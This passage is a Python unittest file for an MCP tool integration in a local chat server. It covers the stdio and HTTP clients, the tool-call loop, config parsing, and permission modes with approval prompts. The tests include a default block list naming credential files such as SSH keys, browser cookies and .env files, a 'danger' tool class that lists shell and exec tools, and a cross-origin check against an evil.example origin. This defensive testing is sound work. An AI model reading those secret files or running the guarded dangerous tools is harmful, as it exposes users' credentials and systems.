"""serve/test_mcp.py - tools from MCP servers (serve/mcp.py) and the web app's tool loop, against the mock engine and
the fake MCP server in serve/mcp_fake_server.py (no GPU, no pack, no MCP SDK).

    python -m unittest serve.test_mcp -v
"""
from __future__ import annotations

import json
import os
import sys
import tempfile
import threading
import time
import unittest
import urllib.error
import urllib.request
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))
from serve import mcp_fake_server as fake  # noqa: E402
from serve.frontend import ChatTemplate  # noqa: E402
from serve.mcp import (MODES, ApprovalGate, McpCancelled, McpHub, classify, decide,  # noqa: E402
                       hub_from_config, settings_from, touches_protected, BlockList)
from serve.server import ByteTokenizer, MockEngine, Service, serve  # noqa: E402

ROOT = Path(__file__).resolve().parents[1]
FAKE = str(ROOT / "serve" / "mcp_fake_server.py")
CTX = 8192


def stdio(*args, **extra):
    return {"command": sys.executable, "args": [FAKE, *args], **extra}


def call_script(name, **params):
    """The model's text for one tool call, as Qwen's template asks for it."""
    body = "".join(f"<parameter={k}>\n{v}\n</parameter>\n" for k, v in params.items())
    return f"</think>\n\nLet me check.\n\n<tool_call>\n<function={name}>\n{body}</function>\n</tool_call>"


class ScriptedEngine(MockEngine):
    """A mock engine with one script per call (the last one repeats): a tool call first, then the answer."""

    def __init__(self, tok, scripts, max_context=CTX, delay_s=0.0):
        super().__init__(tok, list(scripts), max_context=max_context, delay_s=delay_s)
        self.prompts = []

    def generate(self, ids, max_new, sampling, cancel, embeddings=None):
        self.prompts.append(list(ids))
        yield from super().generate(ids, max_new, sampling, cancel, embeddings)

    def prompt_text(self, i):
        return bytes(t for t in self.prompts[i] if t < 256).decode("utf-8", "replace")


# ------------------------------------------------------------------------------------------------ the client
class Client(unittest.TestCase):
    """The stdio client against the fake server: start, pagination, calls, errors, crashes, timeouts, the cap."""

    @classmethod
    def setUpClass(cls):
        cls.log = tempfile.NamedTemporaryFile(delete=False, suffix=".jsonl")
        cls.log.close()
        os.environ["FAKE_MCP_LOG"] = cls.log.name
        cls.hub = McpHub({"fake": stdio(), "paged": stdio("--page", "4"), "broken": stdio("--crash-at-start"),
                          "missing": {"command": "strata-no-such-program"}},
                         {"timeout_s": 1.5, "max_result_chars": 1000})
        cls.hub.start(wait=True)

    @classmethod
    def tearDownClass(cls):
        cls.hub.close()
        del os.environ["FAKE_MCP_LOG"]
        os.unlink(cls.log.name)

    def test_initialize_and_list_every_page(self):
        s = self.hub.servers["fake"]
        self.assertEqual(s.status, "ready")
        self.assertEqual(s.info["name"], "fake")
        self.assertEqual(s.info["protocol"], "2025-06-18")
        want = [t["name"] for t in fake.TOOLS]
        self.assertEqual([t["name"] for t in s.tools], want)         # 3 pages of 2
        self.assertEqual([t["name"] for t in self.hub.servers["paged"].tools], want)   # 2 pages of 4

    def test_namespaced_openai_tools(self):
        tools = self.hub.openai_tools()
        names = [t["function"]["name"] for t in tools]
        self.assertIn("fake__echo", names)
        self.assertIn("paged__echo", names)
        echo = next(t for t in tools if t["function"]["name"] == "fake__echo")
        self.assertEqual(echo["type"], "function")
        self.assertEqual(echo["function"]["parameters"]["properties"]["text"]["type"], "string")

    def test_a_server_that_fails_is_left_out(self):
        for name, why in (("broken", "missing configuration"), ("missing", "could not start")):
            with self.subTest(name=name):
                s = self.hub.servers[name]
                self.assertEqual(s.status, "failed")
                self.assertIn(why, s.error)
                self.assertFalse([t for t in self.hub.template_tools() if t["name"].startswith(name + "__")])
        st = {s["name"]: s for s in self.hub.status()["servers"]}
        self.assertEqual(st["broken"]["status"], "failed")
        self.assertEqual(st["fake"]["status"], "ready")

    def test_call(self):
        self.hub.routes()
        r = self.hub.call("fake__echo", {"text": "hello wörld"})
        self.assertEqual((r["ok"], r["text"], r["server"], r["tool"]), (True, "hello wörld", "fake", "echo"))
        self.assertEqual(self.hub.call("fake__add", {"a": 2, "b": 40})["text"], "42")

    def test_errors_become_text(self):
        self.hub.routes()
        r = self.hub.call("fake__fail", {})                         # the tool's own error (isError)
        self.assertFalse(r["ok"])
        self.assertEqual(r["text"], "error: it failed on purpose")
        r = self.hub.call("nobody__nothing", {})                    # not a tool at all
        self.assertTrue(r["text"].startswith("error: there is no tool"))
        # a JSON-RPC error from the server
        s = self.hub.servers["fake"]
        with self.assertRaises(Exception) as ctx:
            s.call("no-such-tool", {}, 5)
        self.assertIn("unknown tool", str(ctx.exception))

    def test_timeout(self):
        self.hub.routes()
        t0 = time.monotonic()
        r = self.hub.call("fake__sleep", {"seconds": 5})
        self.assertLess(time.monotonic() - t0, 4)
        self.assertFalse(r["ok"])
        self.assertIn("timed out after 1.5 s", r["text"])
        self.assertEqual(self.hub.call("fake__echo", {"text": "still here"})["text"], "still here")

    def test_truncation(self):
        self.hub.routes()
        r = self.hub.call("fake__big", {"n": 50000})
        self.assertTrue(r["ok"])
        self.assertTrue(r["truncated"])
        self.assertEqual(r["chars"], 50000)
        self.assertTrue(r["text"].startswith("y" * 1000 + "\n\n[... truncated"))
        self.assertIn("50,000 characters", r["text"])
        self.assertLess(len(r["text"]), 1200)

    def test_crash_mid_call_then_restart(self):
        hub = McpHub({"solo": stdio()}, {"timeout_s": 5})
        hub.start(wait=True)
        try:
            hub.routes()
            r = hub.call("solo__die", {})
            self.assertFalse(r["ok"])
            self.assertIn("the server stopped", r["text"])
            self.assertIn("dying on purpose", r["text"])
            self.assertEqual(hub.servers["solo"].status, "stopped")
            self.assertIn("solo__echo", hub.routes())                # its tools stay: the next call restarts it
            self.assertEqual(hub.call("solo__echo", {"text": "back"})["text"], "back")
            self.assertEqual(hub.servers["solo"].status, "ready")
        finally:
            hub.close()

    def test_cancel(self):
        self.hub.routes()
        cancel = threading.Event()
        threading.Timer(0.3, cancel.set).start()
        t0 = time.monotonic()
        with self.assertRaises(McpCancelled):
            self.hub.call("fake__sleep", {"seconds": 1.2}, cancel)
        self.assertLess(time.monotonic() - t0, 1.0)
        time.sleep(0.3)
        seen = [json.loads(line) for line in Path(self.log.name).read_text().splitlines()]
        self.assertTrue(any("cancelled" in e for e in seen), seen)   # notifications/cancelled reached the server


class HttpClient(unittest.TestCase):
    """Streamable HTTP: JSON answers, an event-stream answer, the session id."""

    @classmethod
    def setUpClass(cls):
        cls.httpd = fake.http_server(0)
        url = f"http://127.0.0.1:{cls.httpd.server_address[1]}/mcp"
        cls.hub = McpHub({"web": {"url": url}, "down": {"url": "http://127.0.0.1:9/mcp"}}, {"timeout_s": 1.5})
        cls.hub.start(wait=True)

    @classmethod
    def tearDownClass(cls):
        cls.hub.close()
        cls.httpd.shutdown()
        cls.httpd.server_close()

    def test_list_and_call(self):
        s = self.hub.servers["web"]
        self.assertEqual(s.status, "ready", s.error)
        self.assertEqual(len(s.tools), len(fake.TOOLS))             # pages, with the session id on each request
        self.assertEqual(s.transport.session, "s-1")
        self.hub.routes()
        self.assertEqual(self.hub.call("web__echo", {"text": "over http"})["text"], "over http")   # event stream
        self.assertEqual(self.hub.call("web__fail", {})["text"], "error: it failed on purpose")

    def test_timeout_and_unreachable(self):
        self.hub.routes()
        r = self.hub.call("web__sleep", {"seconds": 4})
        self.assertIn("timed out", r["text"])
        self.assertEqual(self.hub.servers["down"].status, "failed")
        self.assertIn("could not reach", self.hub.servers["down"].error)


class Config(unittest.TestCase):
    def test_both_spellings_and_the_file(self):
        with tempfile.TemporaryDirectory() as d:
            path = os.path.join(d, "claude_desktop_config.json")
            Path(path).write_text(json.dumps({"mcpServers": {"b": {"url": "http://x/mcp"}, "a": stdio()}}),
                                  encoding="utf-8")
            hub = hub_from_config({"mcp_servers": {"a": {"command": "old"}},
                                   "mcpServers": {"c": stdio(), "off": {"command": "x", "disabled": True}},
                                   "mcp": {"timeout_s": 5, "max_result_chars": 100, "max_rounds": 3}}, path)
            self.assertEqual(sorted(hub.servers), ["a", "b", "c", "strata"])         # "strata": the built-in ask_user
            self.assertEqual(hub.servers["a"].cfg["command"], sys.executable)   # the file wins a name clash
            self.assertEqual(hub.servers["b"].kind, "http")
            self.assertEqual((hub.settings["timeout_s"], hub.settings["max_result_chars"], hub.settings["max_rounds"]),
                             (5.0, 100, 3))
        self.assertIsNone(hub_from_config({}))
        self.assertEqual(McpHub({}).settings["max_result_chars"], 20000)

    def test_bad_entries_stop_the_start(self):
        for cfg in ({"mcp_servers": {"x": {}}}, {"mcp_servers": {"x": {"command": "a", "args": "b"}}},
                    {"mcp_servers": ["x"]}, {"mcpServers": {"x": {"url": "http://a", "type": "sse"}}},
                    {"mcp_servers": {"x": {"command": "a"}}, "mcp": {"timeout_s": 0}},
                    {"mcp_servers": {"x": {"command": "a"}}, "mcp": {"max_rounds": 1.5}}):
            with self.subTest(cfg=cfg), self.assertRaises(SystemExit):
                hub_from_config(cfg)
        with self.assertRaises(SystemExit):
            hub_from_config({}, os.path.join(tempfile.gettempdir(), "strata-no-such-mcp.json"))


# ------------------------------------------------------------------------------------------------ the tool loop
class ToolLoop(unittest.TestCase):
    """The web app's chat (`"strata_mcp": true`): the model calls an MCP tool, the server runs it and the model
    answers with its result; plain API requests never see the MCP tools."""

    def setUp(self):
        self.log = tempfile.NamedTemporaryFile(delete=False, suffix=".jsonl")
        self.log.close()
        os.environ["FAKE_MCP_LOG"] = self.log.name
        self.hub = McpHub({"fake": stdio(), "broken": stdio("--crash-at-start")},
                          {"timeout_s": 10, "max_result_chars": 500, "max_rounds": 2})
        self.hub.start(wait=True)
        self.httpd = None

    def tearDown(self):
        if self.httpd:
            self.httpd.shutdown()
            self.httpd.server_close()
        self.hub.close()
        del os.environ["FAKE_MCP_LOG"]
        os.unlink(self.log.name)

    def start(self, *scripts, delay_s=0.0):
        tok = ByteTokenizer()
        self.engine = ScriptedEngine(tok, list(scripts), delay_s=delay_s)
        self.svc = Service(self.engine, tok, ChatTemplate(ROOT / "serve/chat_template.jinja"))
        self.svc.mcp = self.hub
        self.httpd = serve(self.svc, port=0)
        self.base = f"http://127.0.0.1:{self.httpd.server_address[1]}"

    def post(self, body, headers=None, stream=True):
        body = {"model": "m", "messages": [{"role": "user", "content": "check it"}], "stream": stream, **body}
        req = urllib.request.Request(self.base + "/v1/chat/completions", data=json.dumps(body).encode(),
                                     headers={"Content-Type": "application/json", **(headers or {})})
        try:
            with urllib.request.urlopen(req, timeout=30) as r:
                text = r.read().decode()
                return r.status, text
        except urllib.error.HTTPError as e:
            with e:
                return e.code, e.read().decode()

    @staticmethod
    def chunks(text):
        return [json.loads(line[6:]) for line in text.splitlines() if line.startswith("data: {")]

    def test_tool_call_then_answer(self):
        self.start(call_script("fake__echo", text="hello from the tool"), "</think>\n\nThe tool said hello.")
        code, text = self.post({"strata_mcp": True})
        self.assertEqual(code, 200, text)
        cs = self.chunks(text)
        mcp = [c["strata_mcp"] for c in cs if "strata_mcp" in c]
        self.assertEqual([m["event"] for m in mcp], ["start", "call", "result"])
        self.assertEqual(mcp[1]["arguments"], {"text": "hello from the tool"})
        self.assertEqual((mcp[1]["server"], mcp[1]["tool"]), ("fake", "echo"))
        self.assertEqual((mcp[2]["ok"], mcp[2]["text"]), (True, "hello from the tool"))
        self.assertEqual(len({m["id"] for m in mcp}), 1)
        content = "".join((c["choices"][0]["delta"].get("content") or "") for c in cs)
        self.assertEqual(content, "Let me check.The tool said hello.")
        self.assertFalse([c for c in cs if c["choices"][0]["delta"].get("tool_calls")])   # nothing for the client to run
        self.assertEqual(cs[-1]["choices"][0]["finish_reason"], "stop")
        self.assertEqual(len(self.engine.prompts), 2)
        first, second = self.engine.prompt_text(0), self.engine.prompt_text(1)
        self.assertIn('"name": "fake__echo"', first)                 # the MCP tools are in the prompt
        self.assertNotIn("broken__", first)                          # the server that failed is left out
        self.assertIn("<function=fake__echo>\n<parameter=text>\nhello from the tool\n</parameter>", second)
        self.assertIn("<tool_response>\nhello from the tool\n</tool_response>", second)
        self.assertEqual(cs[-1]["usage"]["prompt_tokens"], len(self.engine.prompts[1]))

    def test_a_call_the_output_ends_inside_is_not_run(self):
        """#211: the model's turn ends inside an MCP call: nothing runs (it used to run with no arguments)."""
        script = call_script("fake__echo", text="hello from the tool")
        self.start(script[:script.index("from the tool")], "</think>\n\nnever")
        code, text = self.post({"strata_mcp": True})
        self.assertEqual(code, 200, text)
        cs = self.chunks(text)
        mcp = [c["strata_mcp"] for c in cs if "strata_mcp" in c]
        self.assertEqual([m["event"] for m in mcp], ["start"])        # the web app shows it as "Not run" at the end
        self.assertEqual(len(self.engine.prompts), 1)
        self.assertNotIn('"call"', Path(self.log.name).read_text())    # nothing ran
        self.assertEqual(cs[-1]["choices"][0]["finish_reason"], "stop")

    def test_non_stream(self):
        self.start(call_script("fake__add", a=2, b=3), "</think>\n\n5.")
        code, text = self.post({"strata_mcp": True}, stream=False)
        self.assertEqual(code, 200, text)
        msg = json.loads(text)["choices"][0]["message"]
        self.assertEqual(msg["content"], "Let me check.5.")
        self.assertEqual(msg["strata_mcp"][-1]["text"], "5")

    def test_plain_requests_get_no_mcp_tools(self):
        self.start(call_script("fake__echo", text="x"), "</think>\n\nnever")
        code, text = self.post({})
        self.assertEqual(code, 200, text)
        self.assertNotIn("fake__echo", self.engine.prompt_text(0))
        cs = self.chunks(text)
        self.assertFalse([c for c in cs if "strata_mcp" in c])
        self.assertEqual(cs[-1]["choices"][0]["finish_reason"], "tool_calls")   # returned to the client as always
        self.assertEqual(len(self.engine.prompts), 1)
        self.assertNotIn('"call"', Path(self.log.name).read_text())    # nothing ran
        for req in ({"strata_mcp": "yes"}, {"strata_mcp": 1}):         # only a real true opts in
            self.post(req)
            self.assertNotIn("fake__echo", self.engine.prompt_text(-1))

    def test_own_tools_still_go_to_the_client(self):
        own = [{"type": "function", "function": {"name": "lookup", "parameters": {"type": "object", "properties": {
            "q": {"type": "string"}}}}}]
        self.start(call_script("lookup", q="x"), "</think>\n\nnever")
        code, text = self.post({"strata_mcp": True, "tools": own})
        cs = self.chunks(text)
        calls = [tc for c in cs for tc in c["choices"][0]["delta"].get("tool_calls") or []]
        self.assertEqual(calls[0]["function"]["name"], "lookup")
        self.assertEqual(cs[-1]["choices"][0]["finish_reason"], "tool_calls")
        self.assertIn('"name": "lookup"', self.engine.prompt_text(0))
        self.assertIn('"name": "fake__echo"', self.engine.prompt_text(0))
        self.assertEqual(len(self.engine.prompts), 1)

    def test_tool_error_is_a_result(self):
        self.start(call_script("fake__fail"), "</think>\n\nIt failed.")
        code, text = self.post({"strata_mcp": True})
        mcp = [c["strata_mcp"] for c in self.chunks(text) if "strata_mcp" in c]
        self.assertEqual((mcp[-1]["ok"], mcp[-1]["text"]), (False, "error: it failed on purpose"))
        self.assertIn("<tool_response>\nerror: it failed on purpose\n</tool_response>", self.engine.prompt_text(1))
        self.assertEqual(self.chunks(text)[-1]["choices"][0]["finish_reason"], "stop")

    def test_truncated_for_the_model(self):
        self.start(call_script("fake__big", n=3000), "</think>\n\nLong.")
        self.post({"strata_mcp": True})
        second = self.engine.prompt_text(1)
        self.assertIn("y" * 500 + "\n\n[... truncated: the tool returned 3,000 characters", second)
        self.assertNotIn("y" * 501, second)

    def test_max_rounds(self):
        self.start(call_script("fake__echo", text="again"))          # the model never stops calling
        code, text = self.post({"strata_mcp": True})
        mcp = [c["strata_mcp"] for c in self.chunks(text) if "strata_mcp" in c]
        self.assertEqual(len(self.engine.prompts), 3)                # 2 rounds of tools, then the limit
        self.assertEqual(sum(m["event"] == "call" for m in mcp), 2)
        self.assertIn({"event": "limit", "max_rounds": 2}, mcp)
        self.assertTrue(mcp[-1].get("skipped"))
        self.assertEqual(self.chunks(text)[-1]["choices"][0]["finish_reason"], "stop")

    def test_stop_during_a_tool(self):
        """Closing the connection while a slow tool runs stops the tool (notifications/cancelled) and the loop."""
        self.start(call_script("fake__sleep", seconds=8), "</think>\n\nnever")
        body = {"model": "m", "messages": [{"role": "user", "content": "x"}], "stream": True, "strata_mcp": True}
        req = urllib.request.Request(self.base + "/v1/chat/completions", data=json.dumps(body).encode(),
                                     headers={"Content-Type": "application/json"})
        r = urllib.request.urlopen(req, timeout=30)
        for raw in r:
            if b'"event": "call"' in raw:
                break
        r.close()                                                    # the web app's Stop aborts the fetch
        t0 = time.monotonic()
        while time.monotonic() - t0 < 6 and "cancelled" not in Path(self.log.name).read_text():
            time.sleep(0.1)
        self.assertIn("cancelled", Path(self.log.name).read_text())
        self.assertLess(time.monotonic() - t0, 6)
        time.sleep(0.5)
        self.assertEqual(len(self.engine.prompts), 1)                # no second round
        self.assertFalse(self.svc.status["busy"])

    def test_only_from_the_app_s_own_page(self):
        self.start("</think>\n\nhi")
        req = urllib.request.Request(self.base + "/v1/chat/completions", data=json.dumps(
            {"model": "m", "messages": [{"role": "user", "content": "x"}], "strata_mcp": True}).encode(),
            headers={"Content-Type": "text/plain"})                  # a cross-site "simple" request
        with self.assertRaises(urllib.error.HTTPError) as ctx:
            urllib.request.urlopen(req, timeout=10)
        self.assertEqual(ctx.exception.code, 415)
        code, _ = self.post({"strata_mcp": True}, {"Origin": "http://evil.example"})
        self.assertEqual(code, 403)
        self.assertEqual(self.engine.prompts, [])
        host = self.base.split("://", 1)[1]
        code, _ = self.post({"strata_mcp": True}, {"Origin": "http://" + host})
        self.assertEqual(code, 200)

    def test_get_mcp(self):
        self.start("</think>\n\nhi")
        with urllib.request.urlopen(self.base + "/mcp", timeout=10) as r:
            st = json.loads(r.read())
        servers = {s["name"]: s for s in st["servers"]}
        self.assertEqual(servers["fake"]["status"], "ready")
        self.assertEqual(servers["fake"]["transport"], "stdio")
        self.assertIn("fake__echo", [t["name"] for t in servers["fake"]["tools"]])
        self.assertEqual(servers["broken"]["status"], "failed")
        self.assertIn("missing configuration", servers["broken"]["error"])
        self.assertEqual(st["tools"], len(fake.TOOLS) + 1)                        # + the built-in ask_user
        self.assertEqual(servers["strata"]["tools"][0]["tool"], "ask_user")
        self.assertEqual(st["settings"]["max_rounds"], 2)
        self.svc.api_key = "k"
        with self.assertRaises(urllib.error.HTTPError):
            urllib.request.urlopen(self.base + "/mcp", timeout=10)
        self.svc.api_key = ""


# ------------------------------------------------------------------------------------------------ permission modes
class PermissionRules(unittest.TestCase):
    """classify() and decide(): what a tool is, and what each mode does with it (no server, no engine)."""

    def test_classify_names_and_hints(self):
        read = ["read_file", "list_directory", "search_files", "get_file_info", "fetch", "directory_tree", "grep"]
        write = ["write_file", "edit_file", "create_directory", "add_note", "update_row", "echo"]
        danger = ["delete_file", "remove_dir", "move_file", "rename", "exec", "run_command", "shell", "kill_process",
                  "send_email", "git_push", "drop_table"]
        for n in read:
            self.assertEqual(classify({"name": n}), "read", n)
        for n in write:
            self.assertEqual(classify({"name": n}), "write", n)
        for n in danger:
            self.assertEqual(classify({"name": n}), "danger", n)
        self.assertEqual(classify({"name": "directory_tree", "annotations": {"readOnlyHint": True}}), "read")
        self.assertEqual(classify({"name": "weird", "annotations": {"readOnlyHint": True}}), "read")
        self.assertEqual(classify({"name": "weird"}), "write")                      # unknown: treated as a change
        self.assertEqual(classify({"name": "delete_x", "annotations": {"readOnlyHint": True}}), "danger")   # name wins
        self.assertEqual(classify({"name": "running_jobs"}), "write")              # "run" inside "running" is no command
        self.assertEqual(classify({"name": "echo"}, {"echo": "read"}), "read")     # the config overrides the guess

    def test_decide_matrix(self):
        table = {"off": ("deny", "deny", "deny"), "read": ("allow", "deny", "deny"), "ask": ("allow", "ask", "ask"),
                 "edit": ("allow", "allow", "ask"), "full": ("allow", "allow", "allow")}
        self.assertEqual(set(table), set(MODES))
        for mode, row in table.items():
            self.assertEqual(tuple(decide(mode, k) for k in ("read", "write", "danger")), row, mode)
        self.assertEqual(decide("ask", "danger", always=True), "allow")             # "Always allow" in a mode that asks
        self.assertEqual(decide("read", "write", always=True), "deny")              # ... never overrides read-only

    def test_gate(self):
        g = ApprovalGate()
        t = g.open("fake__add")
        self.assertIsNone(g.poll(t, 0.01))
        self.assertTrue(g.resolve(t, True, always=True))
        self.assertTrue(g.poll(t, 0.01))
        self.assertIn("fake__add", g.always)
        self.assertFalse(g.resolve(t, False))                                       # answered once only
        self.assertFalse(g.resolve("nope", True))
        t2 = g.open("x")
        g.resolve(t2, False, always=True)
        self.assertNotIn("x", g.always)                                             # a Deny remembers nothing

    def test_protected_path_matching(self):
        root = os.path.join(tempfile.gettempdir(), "strata_protected_probe")
        inside = os.path.join(root, "sub", "x.txt")
        self.assertTrue(touches_protected({"path": inside}, [root]))
        self.assertTrue(touches_protected({"path": inside.upper().replace("/", "\\")}, [root]))      # case and slashes
        self.assertTrue(touches_protected({"a": [{"dest": inside}], "n": 1}, [root]))                # nested arguments
        self.assertTrue(touches_protected({"path": os.path.join(root, "a", "..", "b.txt")}, [root]))  # `..` resolved
        self.assertTrue(touches_protected({"path": "\\\\?\\" + inside}, [root]) or os.name != "nt")   # \\?\ long form
        self.assertTrue(touches_protected({"path": "\\\\?\\GLOBALROOT\\Device\\x"}, [root]))          # can't be checked
        self.assertFalse(touches_protected({"path": root + "_sibling\\x"}, [root]))                  # a sibling is not inside
        self.assertFalse(touches_protected({"path": inside}, []))                                    # nothing protected
        self.assertFalse(touches_protected({"text": "hello", "n": 3}, [root]))                       # no path at all
        self.assertFalse(touches_protected({"content": (inside + " ") * 400}, [root]))               # long text is content
        self.assertEqual(settings_from({"mcp": {"protected_paths": ["C:\\"]}}), {"protected_paths": ["C:\\"]})
        for bad in ("C:\\", [""], [3]):
            with self.assertRaises(SystemExit):
                settings_from({"mcp": {"protected_paths": bad}})

    def test_block_list_matching_and_defaults(self):
        tmp = os.path.join(tempfile.gettempdir(), "strata_block_probe")
        b = BlockList([os.path.join(tmp, "secret"), "*.kdbx", "@defaults"])
        self.assertTrue(b.blocks({"path": os.path.join(tmp, "secret", "a", "b.txt")}))          # inside a blocked folder
        self.assertTrue(b.blocks({"path": os.path.join(tmp, "x", "vault.KDBX")}))               # a pattern, any case
        self.assertTrue(b.blocks({"paths": [os.path.join(tmp, "ok.txt"), os.path.join(tmp, "secret")]}))   # one of many
        self.assertFalse(b.blocks({"path": os.path.join(tmp, "secret_sibling", "a.txt")}))      # a sibling is not inside
        self.assertFalse(b.blocks({"path": os.path.join(tmp, "notes.txt"), "n": 3}))
        self.assertTrue(b.blocks({"path": "\\\\?\\GLOBALROOT\\Device\\x"}))                      # can't be checked: blocked
        self.assertTrue(b.blocks({"path": os.path.expanduser("~/.ssh/id_rsa")}))                # the built-in list
        self.assertTrue(b.blocks({"path": os.path.expandvars("%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\Cookies")}))
        self.assertTrue(b.blocks({"path": os.path.join(tmp, "app", ".env")}))
        self.assertTrue(b.blocks({"path": os.path.expanduser("~/.claude.json.backup")}))          # Claude Code's account file
        self.assertFalse(b.blocks({"path": os.path.expanduser("~/Documents/notes.txt")}))
        self.assertFalse(BlockList([]).blocks({"path": os.path.expanduser("~/.ssh/id_rsa")}))   # no list, nothing blocked
        self.assertFalse(bool(BlockList(["%NO_SUCH_VARIABLE_X%\\a"])))                         # an unset variable is skipped
        self.assertEqual(settings_from({"mcp": {"blocked_paths": ["@defaults", "E:\\private"]}}),
                         {"blocked_paths": ["@defaults", "E:\\private"]})
        for bad in ("@defaults", [""], [1]):
            with self.assertRaises(SystemExit):
                settings_from({"mcp": {"blocked_paths": bad}})

    def test_block_list_hides_names_in_listings(self):
        home = os.path.expanduser("~")
        b = BlockList(["@defaults"])
        out, n = b.filter_listing("list_directory", {"path": home}, "[DIR] .ssh\n[FILE] notes.txt\n[DIR] Documents")
        self.assertEqual((n, ".ssh" in out, "notes.txt" in out), (1, False, True))
        self.assertIn("1 entry hidden", out)
        sized = "[FILE] " + ".env".ljust(30) + " " + "12 B".rjust(10) + "\n[FILE] " + "a.txt".ljust(30) + " " + "3 B".rjust(10)
        out, n = b.filter_listing("list_directory_with_sizes", {"path": home}, sized)
        self.assertEqual((n, ".env" in out, "a.txt" in out), (1, False, True))
        tree = json.dumps([{"name": ".ssh", "type": "directory", "children": [{"name": "id_rsa", "type": "file"}]},
                           {"name": "src", "type": "directory", "children": [{"name": ".env", "type": "file"},
                                                                             {"name": "app.py", "type": "file"}]}])
        out, n = b.filter_listing("directory_tree", {"path": home}, tree)
        self.assertEqual(n, 2)
        self.assertNotIn("id_rsa", out)
        self.assertIn("app.py", out)
        found = "\n".join([os.path.join(home, ".ssh", "id_rsa"), os.path.join(home, "Documents", "id_rsa_notes.txt"),
                           os.path.join(home, "work", "app.py")])
        out, n = b.filter_listing("search_files", {"path": home}, found)
        self.assertEqual(n, 2)                                                                  # the key and the id_rsa* file
        self.assertIn("app.py", out)
        self.assertEqual(b.filter_listing("read_text_file", {"path": home}, "[DIR] .ssh"), ("[DIR] .ssh", 0))   # not a listing

    def test_settings_from(self):
        self.assertEqual(settings_from({"mcp": {"permission": "edit", "approval_timeout_s": 5,
                                                "tool_classes": {"echo": "read"}}}),
                         {"permission": "edit", "approval_timeout_s": 5.0, "tool_classes": {"echo": "read"}})
        for bad in ({"permission": "root"}, {"approval_timeout_s": 0}, {"tool_classes": {"a": "evil"}}):
            with self.assertRaises(SystemExit):
                settings_from({"mcp": bad})


class Permissions(unittest.TestCase):
    """The permission modes through the real server: what runs by itself, what waits for the click, what is refused.
    `fake__echo` is a read tool, `fake__add` a write tool and `fake__big` a dangerous one (tool_classes)."""

    start = ToolLoop.start

    def setUp(self):
        self.log = tempfile.NamedTemporaryFile(delete=False, suffix=".jsonl")
        self.log.close()
        os.environ["FAKE_MCP_LOG"] = self.log.name
        self.httpd = None
        self.hub = None

    def make(self, **settings):
        self.hub = McpHub({"fake": stdio()}, {"timeout_s": 10, "tool_classes": {"echo": "read", "add": "write", "big": "danger"},
                                              **settings})
        self.hub.start(wait=True)

    def tearDown(self):
        if self.httpd:
            self.httpd.shutdown()
            self.httpd.server_close()
        if self.hub:
            self.hub.close()
        del os.environ["FAKE_MCP_LOG"]
        os.unlink(self.log.name)

    def open(self, mode, path="/v1/chat/completions", **extra):
        body = {"model": "m", "messages": [{"role": "user", "content": "do it"}], "stream": True,
                "strata_mcp": True, "strata_permission": mode, **extra}
        req = urllib.request.Request(self.base + path, data=json.dumps(body).encode(),
                                     headers={"Content-Type": "application/json"})
        return urllib.request.urlopen(req, timeout=30)

    def approve(self, token, allow, always=False, headers=None, body=None):
        data = json.dumps(body if body is not None else {"approval": token, "allow": allow, "always": always}).encode()
        req = urllib.request.Request(self.base + "/mcp/approve", data=data,
                                     headers={"Content-Type": "application/json", **(headers or {})})
        try:
            with urllib.request.urlopen(req, timeout=10) as r:
                return r.status
        except urllib.error.HTTPError as e:
            with e:
                return e.code

    def run_mode(self, mode, answer=None, always=False):
        """Posts one chat in `mode`; clicks `answer` (True/False) on the first approval event.  -> the mcp events."""
        events, asked = [], False
        with self.open(mode) as r:
            for raw in r:
                line = raw.decode()
                if not line.startswith("data: {"):
                    continue
                x = json.loads(line[6:]).get("strata_mcp")
                if not x:
                    continue
                events.append(x)
                if x["event"] == "approval" and not asked:
                    asked = True
                    self.assertIsNotNone(answer, "an approval was asked for in a mode that must not ask")
                    self.assertEqual(self.approve(x["approval"], answer, always), 200)
        return events

    def ran(self, name):
        return f'"call": "{name}"' in Path(self.log.name).read_text()

    def test_read_only_runs_reads_and_refuses_changes(self):
        self.make()
        self.start(call_script("fake__echo", text="hi"), "</think>\n\nread it")
        ev = self.run_mode("read")
        self.assertEqual([e["event"] for e in ev], ["start", "call", "result"])
        self.assertEqual((ev[1]["kind"], ev[2]["ok"], ev[2]["text"]), ("read", True, "hi"))
        self.start(call_script("fake__add", a=2, b=3), "</think>\n\nrefused")
        ev = self.run_mode("read")                                                  # a write: refused, never asked
        self.assertEqual([e["event"] for e in ev], ["start", "call", "result"])
        self.assertEqual((ev[1]["kind"], ev[2]["ok"], ev[2].get("denied")), ("write", False, True))
        self.assertIn("Read-only mode", ev[2]["text"])
        self.assertFalse(self.ran("add"))
        self.assertIn("error: Read-only mode", self.engine.prompt_text(1))          # the model read the refusal

    def test_ask_waits_then_runs_after_allow(self):
        self.make()
        self.start(call_script("fake__add", a=2, b=3), "</think>\n\nfive")
        ev = self.run_mode("ask", answer=True)
        self.assertEqual([e["event"] for e in ev], ["start", "call", "approval", "result"])
        self.assertEqual(ev[2]["kind"], "write")
        self.assertEqual((ev[3]["ok"], ev[3]["text"]), (True, "5"))
        self.assertTrue(self.ran("add"))

    def test_ask_deny_never_runs(self):
        self.make()
        self.start(call_script("fake__add", a=2, b=3), "</think>\n\nokay, not done")
        ev = self.run_mode("ask", answer=False)
        self.assertEqual([e["event"] for e in ev], ["start", "call", "approval", "result"])
        self.assertEqual((ev[3]["ok"], ev[3].get("denied")), (False, True))
        self.assertIn("the user did not allow this call", ev[3]["text"])
        self.assertFalse(self.ran("add"))
        self.assertIn("the user did not allow this call", self.engine.prompt_text(1))

    def test_ask_runs_reads_without_asking(self):
        self.make()
        self.start(call_script("fake__echo", text="looked"), "</think>\n\nseen")
        ev = self.run_mode("ask")
        self.assertEqual([e["event"] for e in ev], ["start", "call", "result"])
        self.assertTrue(ev[2]["ok"])

    def test_ask_times_out_to_a_refusal(self):
        self.make(approval_timeout_s=1.5)
        self.start(call_script("fake__add", a=1, b=1), "</think>\n\ntoo slow")
        events = []
        with self.open("ask") as r:
            for raw in r:
                line = raw.decode()
                if line.startswith("data: {") and json.loads(line[6:]).get("strata_mcp"):
                    events.append(json.loads(line[6:])["strata_mcp"])               # nobody answers
        self.assertEqual([e["event"] for e in events], ["start", "call", "approval", "result"])
        self.assertIn("did not answer in time", events[3]["text"])
        self.assertFalse(self.ran("add"))

    def test_always_allow_is_remembered_for_the_tool(self):
        self.make()
        self.start(call_script("fake__add", a=2, b=3), "</think>\n\nfive")
        self.run_mode("ask", answer=True, always=True)
